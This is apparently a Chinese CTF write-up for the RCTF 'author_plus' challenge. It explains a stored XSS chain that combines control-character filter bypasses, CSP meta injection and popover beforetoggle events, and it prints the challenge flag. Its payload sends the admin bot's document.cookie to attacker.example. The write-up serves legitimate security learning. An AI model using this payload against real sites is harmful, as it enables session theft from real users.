# author_plus

## 题目简述

Plus 版仍把用户名写入未加引号的 `<meta name="author" content=...>`，但修补了上一题的直接利用：注册正则禁止尖括号、引号、普通空格、`\t`、`\r`、`\n`，文章正文还会在服务端经过两次 DOMPurify。管理员 Bot 携带 flag cookie，进入文章后会查找并点击 `#audit`。解法组合了不同解析器对控制字符的处理差异、CSP meta 注入和 HTML Popover 的 `beforetoggle` 事件。

## 解题过程

### 两个仍然可控的输入面

用户名过滤与模板如下：

```php
if (preg_match('/[<>\'"\\x20\\t\\r\\n]/', $username)) {
    die("invalid username");
}

<meta name="author" content=<?php echo $pageAuthor; ?>>
```

正则遗漏了垂直制表符 `\x0b` 和换页符 `\x0c`，而模板没有给 `content` 加引号。两种字符在不同语法层的作用不同：

- Chromium 的 CSP 解析会把 `\x0b` 当作指令内的空白，因此它可以分隔 `script-src-elem` 与允许的 URL；HTML 属性解析不会在这里提前结束 `content`。
- HTML 分词器把 `\x0c` 视作属性间空白，因此它可以把后续文本拆成 `http-equiv`、`popover`、`id` 和事件处理器等新属性。

文章正文虽然由 DOMPurify 清洗，但普通 `<button>` 和 `popovertarget` 属性会保留。这正好提供一个不含脚本的交互触发器。

### 构造 meta popover

PDF 中的用户名 payload 可整理为下面的结构；实际提交时把换行删除，并将接收地址替换为自己的监听端点：

```text
script-src-elem%0bhttp://blog-app/assets/js/article.js
%0chttp-equiv=content-security-policy
%0cpopover
%0cid=x
%0conbeforetoggle=location.href=`https://attacker.example/?c=${encodeURIComponent(document.cookie)}`
```

浏览器解析后的关键部分近似为：

```html
<meta name="author"
      content="script-src-elem http://blog-app/assets/js/article.js"
      http-equiv="content-security-policy"
      popover
      id="x"
      onbeforetoggle="location.href=`https://attacker.example/?c=${encodeURIComponent(document.cookie)}`">
```

CSP 阻止 `xss-shield.js`，同时用户名注入的 meta 元素本身成为一个带事件的 popover。

### 劫持 Bot 的点击

发布文章时只需提交能够通过 DOMPurify 的按钮：

```html
<button id="audit" popovertarget="x">Audit</button>
```

这枚按钮出现在页面自带审核链接之前。Bot 的 `page.$('#audit')` 取得第一个匹配元素并点击，按钮尝试切换 `id=x` 的 popover，触发 meta 上的 `beforetoggle`，随后导航到监听端点并携带 cookie。PDF 中的监听日志显示 URL 编码后的验证值为：

```text
RCTF{7h3_pu15_v3r510n_15_ju57_50_50}
```

原 PDF 引用的推文只是技巧来源，且内容不够稳定，正文已完整保留其作用，因此不再保留；更完整的原理和兼容性背景可参阅 PortSwigger 的 [hidden input / meta 标签 XSS 研究](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)。该文章对本题的必要信息就是：不可聚焦的元素也能借 `popover` 与 `onbeforetoggle` 获得用户交互触发点，本文已经转写为具体利用链。

## 方法总结

- 核心技巧：利用 CSP 与 HTML 解析器对控制字符的不同处理，在 meta 上注入 popover 事件，再借 Bot 点击触发。
- 识别信号：黑名单只列出常规空白；未加引号的属性值仍可控；Bot 会点击可预测选择器；净化器允许 popover 相关的无脚本标记。
- 复用要点：分别验证 URL 解码、服务端正则、HTML 分词和 CSP 解析四个阶段，不要笼统地把 `%0b`、`%0c` 都称为“空格”；交互型 Bot 往往能提供比页面加载更稳定的事件触发点。
